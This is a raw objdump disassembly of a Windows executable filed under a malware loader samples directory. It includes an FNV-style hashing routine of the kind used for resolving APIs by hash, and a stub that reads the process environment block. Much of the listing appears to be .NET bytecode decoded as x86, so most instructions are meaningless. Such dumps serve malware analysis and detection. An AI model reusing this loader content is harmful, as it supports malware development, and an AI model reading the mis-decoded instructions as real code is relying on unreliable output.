
malware_samples/loader/c1c3abc6444ddfa7a7e20b1e88f5112023f9766edcae052eba0fda62a3eac4d6.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	03 30                	add    (%rax),%esi
   140001002:	01 00                	add    %eax,(%rax)
   140001004:	18 00                	sbb    %al,(%rax)
   140001006:	00 00                	add    %al,(%rax)
   140001008:	00 00                	add    %al,(%rax)
   14000100a:	00 00                	add    %al,(%rax)
   14000100c:	7f 3d                	jg     0x14000104b
   14000100e:	00 00                	add    %al,(%rax)
   140001010:	04 28                	add    $0x28,%al
   140001012:	11 00                	adc    %eax,(%rax)
   140001014:	00 06                	add    %al,(%rsi)
   140001016:	26 fe 06             	es incb (%rsi)
   140001019:	10 00                	adc    %al,(%rax)
   14000101b:	00 06                	add    %al,(%rsi)
   14000101d:	28 92 00 00 06 26    	sub    %dl,0x26060000(%rdx)
   140001023:	2a 03                	sub    (%rbx),%al
   140001025:	30 01                	xor    %al,(%rcx)
   140001027:	00 07                	add    %al,(%rdi)
   140001029:	00 00                	add    %al,(%rax)
   14000102b:	00 00                	add    %al,(%rax)
   14000102d:	00 00                	add    %al,(%rax)
   14000102f:	00 16                	add    %dl,(%rsi)
   140001031:	80 78 00 00          	cmpb   $0x0,0x0(%rax)
   140001035:	04 2a                	add    $0x2a,%al
   140001037:	cc                   	int3
   140001038:	03 30                	add    (%rax),%esi
   14000103a:	01 00                	add    %eax,(%rax)
   14000103c:	07                   	(bad)
   14000103d:	00 00                	add    %al,(%rax)
   14000103f:	00 00                	add    %al,(%rax)
   140001041:	00 00                	add    %al,(%rax)
   140001043:	00 16                	add    %dl,(%rsi)
   140001045:	80 6d 00 00          	subb   $0x0,0x0(%rbp)
   140001049:	04 2a                	add    $0x2a,%al
   14000104b:	cc                   	int3
   14000104c:	03 30                	add    (%rax),%esi
   14000104e:	01 00                	add    %eax,(%rax)
   140001050:	07                   	(bad)
   140001051:	00 00                	add    %al,(%rax)
   140001053:	00 00                	add    %al,(%rax)
   140001055:	00 00                	add    %al,(%rax)
   140001057:	00 16                	add    %dl,(%rsi)
   140001059:	80 7a 00 00          	cmpb   $0x0,0x0(%rdx)
   14000105d:	04 2a                	add    $0x2a,%al
   14000105f:	cc                   	int3
   140001060:	03 30                	add    (%rax),%esi
   140001062:	01 00                	add    %eax,(%rax)
   140001064:	07                   	(bad)
   140001065:	00 00                	add    %al,(%rax)
   140001067:	00 00                	add    %al,(%rax)
   140001069:	00 00                	add    %al,(%rax)
   14000106b:	00 16                	add    %dl,(%rsi)
   14000106d:	80 7b 00 00          	cmpb   $0x0,0x0(%rbx)
   140001071:	04 2a                	add    $0x2a,%al
   140001073:	cc                   	int3
   140001074:	03 30                	add    (%rax),%esi
   140001076:	01 00                	add    %eax,(%rax)
   140001078:	07                   	(bad)
   140001079:	00 00                	add    %al,(%rax)
   14000107b:	00 00                	add    %al,(%rax)
   14000107d:	00 00                	add    %al,(%rax)
   14000107f:	00 16                	add    %dl,(%rsi)
   140001081:	80 6f 00 00          	subb   $0x0,0x0(%rdi)
   140001085:	04 2a                	add    $0x2a,%al
   140001087:	cc                   	int3
   140001088:	03 30                	add    (%rax),%esi
   14000108a:	01 00                	add    %eax,(%rax)
   14000108c:	07                   	(bad)
   14000108d:	00 00                	add    %al,(%rax)
   14000108f:	00 00                	add    %al,(%rax)
   140001091:	00 00                	add    %al,(%rax)
   140001093:	00 16                	add    %dl,(%rsi)
   140001095:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   140001099:	04 2a                	add    $0x2a,%al
   14000109b:	cc                   	int3
   14000109c:	03 30                	add    (%rax),%esi
   14000109e:	01 00                	add    %eax,(%rax)
   1400010a0:	07                   	(bad)
   1400010a1:	00 00                	add    %al,(%rax)
   1400010a3:	00 00                	add    %al,(%rax)
   1400010a5:	00 00                	add    %al,(%rax)
   1400010a7:	00 16                	add    %dl,(%rsi)
   1400010a9:	80 73 00 00          	xorb   $0x0,0x0(%rbx)
   1400010ad:	04 2a                	add    $0x2a,%al
   1400010af:	cc                   	int3
   1400010b0:	03 30                	add    (%rax),%esi
   1400010b2:	01 00                	add    %eax,(%rax)
   1400010b4:	07                   	(bad)
   1400010b5:	00 00                	add    %al,(%rax)
   1400010b7:	00 00                	add    %al,(%rax)
   1400010b9:	00 00                	add    %al,(%rax)
   1400010bb:	00 02                	add    %al,(%rdx)
   1400010bd:	28 05 00 00 0a 2a    	sub    %al,0x2a0a0000(%rip)        # 0x16a0a10c3
   1400010c3:	cc                   	int3
   1400010c4:	03 30                	add    (%rax),%esi
   1400010c6:	02 00                	add    (%rax),%al
   1400010c8:	11 00                	adc    %eax,(%rax)
   1400010ca:	00 00                	add    %al,(%rax)
   1400010cc:	00 00                	add    %al,(%rax)
   1400010ce:	00 00                	add    %al,(%rax)
   1400010d0:	02 7f 43             	add    0x43(%rdi),%bh
   1400010d3:	00 00                	add    %al,(%rax)
   1400010d5:	04 55                	add    $0x55,%al
   1400010d7:	02 1e                	add    (%rsi),%bl
   1400010d9:	6a 58                	push   $0x58
   1400010db:	28 e9                	sub    %ch,%cl
   1400010dd:	00 00                	add    %al,(%rax)
   1400010df:	06                   	(bad)
   1400010e0:	2a 00                	sub    (%rax),%al
   1400010e2:	00 00                	add    %al,(%rax)
   1400010e4:	0b 30                	or     (%rax),%esi
   1400010e6:	03 00                	add    (%rax),%eax
   1400010e8:	2e 00 00             	cs add %al,(%rax)
   1400010eb:	00 02                	add    %al,(%rdx)
   1400010ed:	00 00                	add    %al,(%rax)
   1400010ef:	11 02                	adc    %eax,(%rdx)
   1400010f1:	7f 43                	jg     0x140001136
   1400010f3:	00 00                	add    %al,(%rax)
   1400010f5:	04 55                	add    $0x55,%al
   1400010f7:	02 1e                	add    (%rsi),%bl
   1400010f9:	6a 58                	push   $0x58
   1400010fb:	0a 06                	or     (%rsi),%al
   1400010fd:	16                   	(bad)
   1400010fe:	1f                   	(bad)
   1400010ff:	10 6a fe             	adc    %ch,-0x2(%rdx)
   140001102:	18 06                	sbb    %al,(%rsi)
   140001104:	03 55 02             	add    0x2(%rbp),%edx
   140001107:	7f 3c                	jg     0x140001145
   140001109:	00 00                	add    %al,(%rax)
   14000110b:	04 55                	add    $0x55,%al
   14000110d:	de 0d fe 06 01 00    	fimuls 0x106fe(%rip)        # 0x140011811
   140001113:	00 06                	add    %al,(%rsi)
   140001115:	02 28                	add    (%rax),%ch
   140001117:	7d 00                	jge    0x140001119
   140001119:	00 06                	add    %al,(%rsi)
   14000111b:	dc 02                	faddl  (%rdx)
   14000111d:	2a 00                	sub    (%rax),%al
   14000111f:	00 41 1c             	add    %al,0x1c(%rcx)
   140001122:	00 00                	add    %al,(%rax)
   140001124:	04 00                	add    $0x0,%al
   140001126:	00 00                	add    %al,(%rax)
   140001128:	16                   	(bad)
   140001129:	00 00                	add    %al,(%rax)
   14000112b:	00 09                	add    %cl,(%rcx)
   14000112d:	00 00                	add    %al,(%rax)
   14000112f:	00 1f                	add    %bl,(%rdi)
   140001131:	00 00                	add    %al,(%rax)
   140001133:	00 0d 00 00 00 3b    	add    %cl,0x3b000000(%rip)        # 0x17b001139
   140001139:	00 00                	add    %al,(%rax)
   14000113b:	01 0b                	add    %ecx,(%rbx)
   14000113d:	30 02                	xor    %al,(%rdx)
   14000113f:	00 24 00             	add    %ah,(%rax,%rax,1)
   140001142:	00 00                	add    %al,(%rax)
   140001144:	00 00                	add    %al,(%rax)
   140001146:	00 00                	add    %al,(%rax)
   140001148:	02 7f 02             	add    0x2(%rdi),%bh
   14000114b:	00 00                	add    %al,(%rax)
   14000114d:	04 28                	add    $0x28,%al
   14000114f:	03 00                	add    (%rax),%eax
   140001151:	00 06                	add    %al,(%rsi)
   140001153:	26 02 7f 35          	es add 0x35(%rdi),%bh
   140001157:	00 00                	add    %al,(%rax)
   140001159:	04 55                	add    $0x55,%al
   14000115b:	de 0d fe 06 05 00    	fimuls 0x506fe(%rip)        # 0x14005185f
   140001161:	00 06                	add    %al,(%rsi)
   140001163:	02 28                	add    (%rax),%ch
   140001165:	7d 00                	jge    0x140001167
   140001167:	00 06                	add    %al,(%rsi)
   140001169:	dc 02                	faddl  (%rdx)
   14000116b:	2a 41 1c             	sub    0x1c(%rcx),%al
   14000116e:	00 00                	add    %al,(%rax)
   140001170:	04 00                	add    $0x0,%al
   140001172:	00 00                	add    %al,(%rax)
   140001174:	0c 00                	or     $0x0,%al
   140001176:	00 00                	add    %al,(%rax)
   140001178:	09 00                	or     %eax,(%rax)
   14000117a:	00 00                	add    %al,(%rax)
   14000117c:	15 00 00 00 0d       	adc    $0xd000000,%eax
   140001181:	00 00                	add    %al,(%rax)
   140001183:	00 3b                	add    %bh,(%rbx)
   140001185:	00 00                	add    %al,(%rax)
   140001187:	01 03                	add    %eax,(%rbx)
   140001189:	30 02                	xor    %al,(%rdx)
   14000118b:	00 15 00 00 00 03    	add    %dl,0x3000000(%rip)        # 0x143001191
   140001191:	00 00                	add    %al,(%rax)
   140001193:	11 12                	adc    %edx,(%rdx)
   140001195:	00 28                	add    %ch,(%rax)
   140001197:	06                   	(bad)
   140001198:	00 00                	add    %al,(%rax)
   14000119a:	06                   	(bad)
   14000119b:	26 12 00             	es adc (%rax),%al
   14000119e:	7f 53                	jg     0x1400011f3
   1400011a0:	00 00                	add    %al,(%rax)
   1400011a2:	04 28                	add    $0x28,%al
   1400011a4:	d5 00 00 06          	{rex2 0x0} add %al,(%rsi)
   1400011a8:	2a cc                	sub    %ah,%cl
   1400011aa:	cc                   	int3
   1400011ab:	cc                   	int3
   1400011ac:	03 30                	add    (%rax),%esi
   1400011ae:	05 00 30 00 00       	add    $0x3000,%eax
   1400011b3:	00 04 00             	add    %al,(%rax,%rax,1)
   1400011b6:	00 11                	add    %dl,(%rcx)
   1400011b8:	03 25 4c 1f 27 6a    	add    0x6a271f4c(%rip),%esp        # 0x1aa27310a
   1400011be:	58                   	pop    %rax
   1400011bf:	55                   	push   %rbp
   1400011c0:	02 4c 0b 07          	add    0x7(%rbx,%rcx,1),%cl
   1400011c4:	1e                   	(bad)
   1400011c5:	6a 59                	push   $0x59
   1400011c7:	4c 0a 07             	rex.WR or (%rdi),%r8b
   1400011ca:	06                   	(bad)
   1400011cb:	59                   	pop    %rcx
   1400011cc:	1e                   	(bad)
   1400011cd:	6a 59                	push   $0x59
   1400011cf:	1f                   	(bad)
   1400011d0:	1f                   	(bad)
   1400011d1:	6a 35                	push   $0x35
   1400011d3:	05 02 06 55 2b       	add    $0x2b550602,%eax
   1400011d8:	0e                   	(bad)
   1400011d9:	16                   	(bad)
   1400011da:	6a 16                	push   $0x16
   1400011dc:	6a 16                	push   $0x16
   1400011de:	6a 16                	push   $0x16
   1400011e0:	16                   	(bad)
   1400011e1:	6a 28                	push   $0x28
   1400011e3:	e2 00                	loop   0x1400011e5
   1400011e5:	00 06                	add    %al,(%rsi)
   1400011e7:	2a 03                	sub    (%rbx),%al
   1400011e9:	30 01                	xor    %al,(%rcx)
   1400011eb:	00 0b                	add    %cl,(%rbx)
   1400011ed:	00 00                	add    %al,(%rax)
   1400011ef:	00 00                	add    %al,(%rax)
   1400011f1:	00 00                	add    %al,(%rax)
   1400011f3:	00 7f 03             	add    %bh,0x3(%rdi)
   1400011f6:	00 00                	add    %al,(%rax)
   1400011f8:	04 28                	add    $0x28,%al
   1400011fa:	df 00                	filds  (%rax)
   1400011fc:	00 06                	add    %al,(%rsi)
   1400011fe:	2a cc                	sub    %ah,%cl
   140001200:	03 30                	add    (%rax),%esi
   140001202:	02 00                	add    (%rax),%al
   140001204:	15 00 00 00 00       	adc    $0x0,%eax
   140001209:	00 00                	add    %al,(%rax)
   14000120b:	00 02                	add    %al,(%rdx)
   14000120d:	80 96 00 00 04 7e 96 	adcb   $0x96,0x7e040000(%rsi)
   140001214:	00 00                	add    %al,(%rax)
   140001216:	04 16                	add    $0x16,%al
   140001218:	6a 33                	push   $0x33
   14000121a:	03 16                	add    (%rsi),%edx
   14000121c:	2b 01                	sub    (%rcx),%eax
   14000121e:	17                   	(bad)
   14000121f:	d2 2a                	shrb   %cl,(%rdx)
   140001221:	cc                   	int3
   140001222:	cc                   	int3
   140001223:	cc                   	int3
   140001224:	03 30                	add    (%rax),%esi
   140001226:	05 00 2f 02 00       	add    $0x22f00,%eax
   14000122b:	00 06                	add    %al,(%rsi)
   14000122d:	00 00                	add    %al,(%rax)
   14000122f:	11 7e 96             	adc    %edi,-0x6a(%rsi)
   140001232:	00 00                	add    %al,(%rax)
   140001234:	04 2d                	add    $0x2d,%al
   140001236:	0b 72 01             	or     0x1(%rdx),%esi
   140001239:	00 00                	add    %al,(%rax)
   14000123b:	70 73                	jo     0x1400012b0
   14000123d:	0b 00                	or     (%rax),%eax
   14000123f:	00 0a                	add    %cl,(%rdx)
   140001241:	7a d0                	jp     0x140001213
   140001243:	03 00                	add    (%rax),%eax
   140001245:	00 01                	add    %al,(%rcx)
   140001247:	28 07                	sub    %al,(%rdi)
   140001249:	00 00                	add    %al,(%rax)
   14000124b:	0a 6f 08             	or     0x8(%rdi),%ch
   14000124e:	00 00                	add    %al,(%rax)
   140001250:	0a 13                	or     (%rbx),%dl
   140001252:	04 28                	add    $0x28,%al
   140001254:	0a 00                	or     (%rax),%al
   140001256:	00 0a                	add    %cl,(%rdx)
   140001258:	13 05 12 05 72 49    	adc    0x49720512(%rip),%eax        # 0x189721770
   14000125e:	00 00                	add    %al,(%rax)
   140001260:	70 28                	jo     0x14000128a
   140001262:	09 00                	or     %eax,(%rax)
   140001264:	00 0a                	add    %cl,(%rdx)
   140001266:	1f                   	(bad)
   140001267:	0a 8d 0f 00 00 01    	or     0x100000f(%rbp),%cl
   14000126d:	0c 08                	or     $0x8,%al
   14000126f:	16                   	(bad)
   140001270:	d0 0e                	rorb   $1,(%rsi)
   140001272:	00 00                	add    %al,(%rax)
   140001274:	01 28                	add    %ebp,(%rax)
   140001276:	07                   	(bad)
   140001277:	00 00                	add    %al,(%rax)
   140001279:	0a a2 08 17 d0 0e    	or     0xed01708(%rdx),%ah
   14000127f:	00 00                	add    %al,(%rax)
   140001281:	01 28                	add    %ebp,(%rax)
   140001283:	07                   	(bad)
   140001284:	00 00                	add    %al,(%rax)
   140001286:	0a a2 08 18 d0 0d    	or     0xdd01808(%rdx),%ah
   14000128c:	00 00                	add    %al,(%rax)
   14000128e:	01 28                	add    %ebp,(%rax)
   140001290:	07                   	(bad)
   140001291:	00 00                	add    %al,(%rax)
   140001293:	0a a2 08 19 d0 0d    	or     0xdd01908(%rdx),%ah
   140001299:	00 00                	add    %al,(%rax)
   14000129b:	01 28                	add    %ebp,(%rax)
   14000129d:	07                   	(bad)
   14000129e:	00 00                	add    %al,(%rax)
   1400012a0:	0a a2 08 1a d0 0e    	or     0xed01a08(%rdx),%ah
   1400012a6:	00 00                	add    %al,(%rax)
   1400012a8:	01 28                	add    %ebp,(%rax)
   1400012aa:	07                   	(bad)
   1400012ab:	00 00                	add    %al,(%rax)
   1400012ad:	0a a2 08 1b d0 0e    	or     0xed01b08(%rdx),%ah
   1400012b3:	00 00                	add    %al,(%rax)
   1400012b5:	01 28                	add    %ebp,(%rax)
   1400012b7:	07                   	(bad)
   1400012b8:	00 00                	add    %al,(%rax)
   1400012ba:	0a a2 08 1c d0 0e    	or     0xed01c08(%rdx),%ah
   1400012c0:	00 00                	add    %al,(%rax)
   1400012c2:	01 28                	add    %ebp,(%rax)
   1400012c4:	07                   	(bad)
   1400012c5:	00 00                	add    %al,(%rax)
   1400012c7:	0a a2 08 1d d0 0e    	or     0xed01d08(%rdx),%ah
   1400012cd:	00 00                	add    %al,(%rax)
   1400012cf:	01 28                	add    %ebp,(%rax)
   1400012d1:	07                   	(bad)
   1400012d2:	00 00                	add    %al,(%rax)
   1400012d4:	0a a2 08 1e d0 0e    	or     0xed01e08(%rdx),%ah
   1400012da:	00 00                	add    %al,(%rax)
   1400012dc:	01 28                	add    %ebp,(%rax)
   1400012de:	07                   	(bad)
   1400012df:	00 00                	add    %al,(%rax)
   1400012e1:	0a a2 08 1f 09 d0    	or     -0x2ff6e0f8(%rdx),%ah
   1400012e7:	0e                   	(bad)
   1400012e8:	00 00                	add    %al,(%rax)
   1400012ea:	01 28                	add    %ebp,(%rax)
   1400012ec:	07                   	(bad)
   1400012ed:	00 00                	add    %al,(%rax)
   1400012ef:	0a a2 d0 0d 00 00    	or     0xdd0(%rdx),%ah
   1400012f5:	01 28                	add    %ebp,(%rax)
   1400012f7:	07                   	(bad)
   1400012f8:	00 00                	add    %al,(%rax)
   1400012fa:	0a 08                	or     (%rax),%cl
   1400012fc:	11 04 17             	adc    %eax,(%rdi,%rdx,1)
   1400012ff:	73 15                	jae    0x140001316
   140001301:	00 00                	add    %al,(%rax)
   140001303:	0a 0d 09 28 17 00    	or     0x172809(%rip),%cl        # 0x140173b12
   140001309:	00 0a                	add    %cl,(%rdx)
   14000130b:	0a 06                	or     (%rsi),%al
   14000130d:	7e 14                	jle    0x140001323
   14000130f:	00 00                	add    %al,(%rax)
   140001311:	0a 6f 1a             	or     0x1a(%rdi),%ch
   140001314:	00 00                	add    %al,(%rax)
   140001316:	0a 06                	or     (%rsi),%al
   140001318:	7e 0d                	jle    0x140001327
   14000131a:	00 00                	add    %al,(%rax)
   14000131c:	0a 6f 1a             	or     0x1a(%rdi),%ch
   14000131f:	00 00                	add    %al,(%rax)
   140001321:	0a 06                	or     (%rsi),%al
   140001323:	7e 12                	jle    0x140001337
   140001325:	00 00                	add    %al,(%rax)
   140001327:	0a 6f 1a             	or     0x1a(%rdi),%ch
   14000132a:	00 00                	add    %al,(%rax)
   14000132c:	0a 06                	or     (%rsi),%al
   14000132e:	7e 13                	jle    0x140001343
   140001330:	00 00                	add    %al,(%rax)
   140001332:	0a 6f 1a             	or     0x1a(%rdi),%ch
   140001335:	00 00                	add    %al,(%rax)
   140001337:	0a 06                	or     (%rsi),%al
   140001339:	7e 0f                	jle    0x14000134a
   14000133b:	00 00                	add    %al,(%rax)
   14000133d:	0a 1a                	or     (%rdx),%bl
   14000133f:	6f                   	outsl  (%rsi),(%dx)
   140001340:	19 00                	sbb    %eax,(%rax)
   140001342:	00 0a                	add    %cl,(%rdx)
   140001344:	06                   	(bad)
   140001345:	7e 0f                	jle    0x140001356
   140001347:	00 00                	add    %al,(%rax)
   140001349:	0a 1b                	or     (%rbx),%bl
   14000134b:	6f                   	outsl  (%rsi),(%dx)
   14000134c:	19 00                	sbb    %eax,(%rax)
   14000134e:	00 0a                	add    %cl,(%rdx)
   140001350:	06                   	(bad)
   140001351:	7e 0f                	jle    0x140001362
   140001353:	00 00                	add    %al,(%rax)
   140001355:	0a 1c 6f             	or     (%rdi,%rbp,2),%bl
   140001358:	19 00                	sbb    %eax,(%rax)
   14000135a:	00 0a                	add    %cl,(%rdx)
   14000135c:	06                   	(bad)
   14000135d:	7e 0f                	jle    0x14000136e
   14000135f:	00 00                	add    %al,(%rax)
   140001361:	0a 1d 6f 19 00 00    	or     0x196f(%rip),%bl        # 0x140002cd6
   140001367:	0a 06                	or     (%rsi),%al
   140001369:	7e 0f                	jle    0x14000137a
   14000136b:	00 00                	add    %al,(%rax)
   14000136d:	0a 1e                	or     (%rsi),%bl
   14000136f:	6f                   	outsl  (%rsi),(%dx)
   140001370:	19 00                	sbb    %eax,(%rax)
   140001372:	00 0a                	add    %cl,(%rdx)
   140001374:	06                   	(bad)
   140001375:	7e 0f                	jle    0x140001386
   140001377:	00 00                	add    %al,(%rax)
   140001379:	0a 1f                	or     (%rdi),%bl
   14000137b:	09 6f 19             	or     %ebp,0x19(%rdi)
   14000137e:	00 00                	add    %al,(%rax)
   140001380:	0a 06                	or     (%rsi),%al
   140001382:	7e 1c                	jle    0x1400013a0
   140001384:	00 00                	add    %al,(%rax)
   140001386:	0a 7e 96             	or     -0x6a(%rsi),%bh
   140001389:	00 00                	add    %al,(%rax)
   14000138b:	04 6f                	add    $0x6f,%al
   14000138d:	18 00                	sbb    %al,(%rax)
   14000138f:	00 0a                	add    %cl,(%rdx)
   140001391:	06                   	(bad)
   140001392:	7e 11                	jle    0x1400013a5
   140001394:	00 00                	add    %al,(%rax)
   140001396:	0a 6f 1a             	or     0x1a(%rdi),%ch
   140001399:	00 00                	add    %al,(%rax)
   14000139b:	0a 1f                	or     (%rdi),%bl
   14000139d:	0a 8d 0f 00 00 01    	or     0x100000f(%rbp),%cl
   1400013a3:	0b 07                	or     (%rdi),%eax
   1400013a5:	16                   	(bad)
   1400013a6:	d0 0e                	rorb   $1,(%rsi)
   1400013a8:	00 00                	add    %al,(%rax)
   1400013aa:	01 28                	add    %ebp,(%rax)
   1400013ac:	07                   	(bad)
   1400013ad:	00 00                	add    %al,(%rax)
   1400013af:	0a a2 07 17 d0 0e    	or     0xed01707(%rdx),%ah
   1400013b5:	00 00                	add    %al,(%rax)
   1400013b7:	01 28                	add    %ebp,(%rax)
   1400013b9:	07                   	(bad)
   1400013ba:	00 00                	add    %al,(%rax)
   1400013bc:	0a a2 07 18 d0 0d    	or     0xdd01807(%rdx),%ah
   1400013c2:	00 00                	add    %al,(%rax)
   1400013c4:	01 28                	add    %ebp,(%rax)
   1400013c6:	07                   	(bad)
   1400013c7:	00 00                	add    %al,(%rax)
   1400013c9:	0a a2 07 19 d0 0d    	or     0xdd01907(%rdx),%ah
   1400013cf:	00 00                	add    %al,(%rax)
   1400013d1:	01 28                	add    %ebp,(%rax)
   1400013d3:	07                   	(bad)
   1400013d4:	00 00                	add    %al,(%rax)
   1400013d6:	0a a2 07 1a d0 0e    	or     0xed01a07(%rdx),%ah
   1400013dc:	00 00                	add    %al,(%rax)
   1400013de:	01 28                	add    %ebp,(%rax)
   1400013e0:	07                   	(bad)
   1400013e1:	00 00                	add    %al,(%rax)
   1400013e3:	0a a2 07 1b d0 0e    	or     0xed01b07(%rdx),%ah
   1400013e9:	00 00                	add    %al,(%rax)
   1400013eb:	01 28                	add    %ebp,(%rax)
   1400013ed:	07                   	(bad)
   1400013ee:	00 00                	add    %al,(%rax)
   1400013f0:	0a a2 07 1c d0 0e    	or     0xed01c07(%rdx),%ah
   1400013f6:	00 00                	add    %al,(%rax)
   1400013f8:	01 28                	add    %ebp,(%rax)
   1400013fa:	07                   	(bad)
   1400013fb:	00 00                	add    %al,(%rax)
   1400013fd:	0a a2 07 1d d0 0e    	or     0xed01d07(%rdx),%ah
   140001403:	00 00                	add    %al,(%rax)
   140001405:	01 28                	add    %ebp,(%rax)
   140001407:	07                   	(bad)
   140001408:	00 00                	add    %al,(%rax)
   14000140a:	0a a2 07 1e d0 0e    	or     0xed01e07(%rdx),%ah
   140001410:	00 00                	add    %al,(%rax)
   140001412:	01 28                	add    %ebp,(%rax)
   140001414:	07                   	(bad)
   140001415:	00 00                	add    %al,(%rax)
   140001417:	0a a2 07 1f 09 d0    	or     -0x2ff6e0f9(%rdx),%ah
   14000141d:	0e                   	(bad)
   14000141e:	00 00                	add    %al,(%rax)
   140001420:	01 28                	add    %ebp,(%rax)
   140001422:	07                   	(bad)
   140001423:	00 00                	add    %al,(%rax)
   140001425:	0a a2 06 7e 0e 00    	or     0xe7e06(%rdx),%ah
   14000142b:	00 0a                	add    %cl,(%rdx)
   14000142d:	19 d0                	sbb    %edx,%eax
   14000142f:	0d 00 00 01 28       	or     $0x28010000,%eax
   140001434:	07                   	(bad)
   140001435:	00 00                	add    %al,(%rax)
   140001437:	0a 07                	or     (%rdi),%al
   140001439:	6f                   	outsl  (%rsi),(%dx)
   14000143a:	1b 00                	sbb    (%rax),%eax
   14000143c:	00 0a                	add    %cl,(%rdx)
   14000143e:	06                   	(bad)
   14000143f:	7e 10                	jle    0x140001451
   140001441:	00 00                	add    %al,(%rax)
   140001443:	0a 6f 1a             	or     0x1a(%rdi),%ch
   140001446:	00 00                	add    %al,(%rax)
   140001448:	0a 09                	or     (%rcx),%cl
   14000144a:	d0 03                	rolb   $1,(%rbx)
   14000144c:	00 00                	add    %al,(%rax)
   14000144e:	02 28                	add    (%rax),%ch
   140001450:	07                   	(bad)
   140001451:	00 00                	add    %al,(%rax)
   140001453:	0a 6f 16             	or     0x16(%rdi),%ch
   140001456:	00 00                	add    %al,(%rax)
   140001458:	0a 74 03 00          	or     0x0(%rbx,%rax,1),%dh
   14000145c:	00 02                	add    %al,(%rdx)
   14000145e:	2a cc                	sub    %ah,%cl
   140001460:	03 30                	add    (%rax),%esi
   140001462:	01 00                	add    %eax,(%rax)
   140001464:	07                   	(bad)
   140001465:	00 00                	add    %al,(%rax)
   140001467:	00 00                	add    %al,(%rax)
   140001469:	00 00                	add    %al,(%rax)
   14000146b:	00 02                	add    %al,(%rdx)
   14000146d:	28 05 00 00 0a 2a    	sub    %al,0x2a0a0000(%rip)        # 0x16a0a1473
   140001473:	cc                   	int3
   140001474:	03 30                	add    (%rax),%esi
   140001476:	01 00                	add    %eax,(%rax)
   140001478:	08 00                	or     %al,(%rax)
   14000147a:	00 00                	add    %al,(%rax)
   14000147c:	00 00                	add    %al,(%rax)
   14000147e:	00 00                	add    %al,(%rax)
   140001480:	16                   	(bad)
   140001481:	6a 80                	push   $0xffffffffffffff80
   140001483:	96                   	xchg   %eax,%esi
   140001484:	00 00                	add    %al,(%rax)
   140001486:	04 2a                	add    $0x2a,%al
   140001488:	03 30                	add    (%rax),%esi
   14000148a:	02 00                	add    (%rax),%al
   14000148c:	43 00 00             	rex.XB add %al,(%r8)
   14000148f:	00 07                	add    %al,(%rdi)
   140001491:	00 00                	add    %al,(%rax)
   140001493:	11 20                	adc    %esp,(%rax)
   140001495:	c5 9d 1c             	(bad)
   140001498:	81 0c 02 46 13 05 11 	orl    $0x11051346,(%rdx,%rax,1)
   14000149f:	05 2c 33 11 05       	add    $0x511332c,%eax
   1400014a4:	13 04 02             	adc    (%rdx,%rax,1),%eax
   1400014a7:	0b 11                	or     (%rcx),%edx
   1400014a9:	04 d2                	add    $0xd2,%al
   1400014ab:	0a 06                	or     (%rsi),%al
   1400014ad:	20 9f 00 00 00 58    	and    %bl,0x58000000(%rdi)
   1400014b3:	d2 1f                	rcrb   %cl,(%rdi)
   1400014b5:	19 35 05 06 1f 20    	sbb    %esi,0x201f0605(%rip)        # 0x1601f1ac0
   1400014bb:	59                   	pop    %rcx
   1400014bc:	0a 06                	or     (%rsi),%al
   1400014be:	08 61 20             	or     %ah,0x20(%rcx)
   1400014c1:	93                   	xchg   %eax,%ebx
   1400014c2:	01 00                	add    %eax,(%rax)
   1400014c4:	01 5a 0c             	add    %ebx,0xc(%rdx)
   1400014c7:	07                   	(bad)
   1400014c8:	17                   	(bad)
   1400014c9:	6a 58                	push   $0x58
   1400014cb:	0b 07                	or     (%rdi),%eax
   1400014cd:	46 0d 09 13 04 09    	rex.RX or $0x9041309,%eax
   1400014d3:	2d d3 08 2a cc       	sub    $0xcc2a08d3,%eax
   1400014d8:	03 30                	add    (%rax),%esi
   1400014da:	03 00                	add    (%rax),%eax
   1400014dc:	6a 00                	push   $0x0
   1400014de:	00 00                	add    %al,(%rax)
   1400014e0:	08 00                	or     %al,(%rax)
   1400014e2:	00 11                	add    %dl,(%rcx)
   1400014e4:	20 c5                	and    %al,%ch
   1400014e6:	9d                   	popf
   1400014e7:	1c 81                	sbb    $0x81,%al
   1400014e9:	13 04 02             	adc    (%rdx,%rax,1),%eax
   1400014ec:	49 13 06             	adc    (%r14),%rax
   1400014ef:	11 06                	adc    %eax,(%rsi)
   1400014f1:	2c 58                	sub    $0x58,%al
   1400014f3:	16                   	(bad)
   1400014f4:	6a 0d                	push   $0xd
   1400014f6:	11 06                	adc    %eax,(%rsi)
   1400014f8:	0c 08                	or     $0x8,%al
   1400014fa:	13 05 12 07 11 05    	adc    0x5110712(%rip),%eax        # 0x145111c12
   140001500:	d2 52 12             	rclb   %cl,0x12(%rdx)
   140001503:	07                   	(bad)
   140001504:	17                   	(bad)
   140001505:	58                   	pop    %rax
   140001506:	11 05 1e 64 52 16    	adc    %eax,0x1652641e(%rip)        # 0x15652792a
   14000150c:	6a 0b                	push   $0xb
   14000150e:	07                   	(bad)
   14000150f:	12 07                	adc    (%rdi),%al
   140001511:	58                   	pop    %rax
   140001512:	47 0a 06             	rex.RXB or (%r14),%r8b
   140001515:	20 9f 00 00 00 58    	and    %bl,0x58000000(%rdi)
   14000151b:	d2 1f                	rcrb   %cl,(%rdi)
   14000151d:	19 35 05 06 1f 20    	sbb    %esi,0x201f0605(%rip)        # 0x1601f1b28
   140001523:	59                   	pop    %rcx
   140001524:	0a 06                	or     (%rsi),%al
   140001526:	11 04 61             	adc    %eax,(%rcx,%riz,2)
   140001529:	20 93 01 00 01 5a    	and    %dl,0x5a010001(%rbx)
   14000152f:	13 04 07             	adc    (%rdi,%rax,1),%eax
   140001532:	17                   	(bad)
   140001533:	6a 58                	push   $0x58
   140001535:	0b 07                	or     (%rdi),%eax
   140001537:	18 6a 32             	sbb    %ch,0x32(%rdx)
   14000153a:	d3 09                	rorl   %cl,(%rcx)
   14000153c:	17                   	(bad)
   14000153d:	6a 58                	push   $0x58
   14000153f:	0d 09 18 6a 5a       	or     $0x5a6a1809,%eax
   140001544:	02 58 49             	add    0x49(%rax),%bl
   140001547:	0c 08                	or     $0x8,%al
   140001549:	2d ae 11 04 2a       	sub    $0x2a0411ae,%eax
   14000154e:	cc                   	int3
   14000154f:	cc                   	int3
   140001550:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140001557:	00 00 
   140001559:	c3                   	ret
   14000155a:	cc                   	int3
   14000155b:	cc                   	int3
   14000155c:	0b 30                	or     (%rax),%esi
   14000155e:	03 00                	add    (%rax),%eax
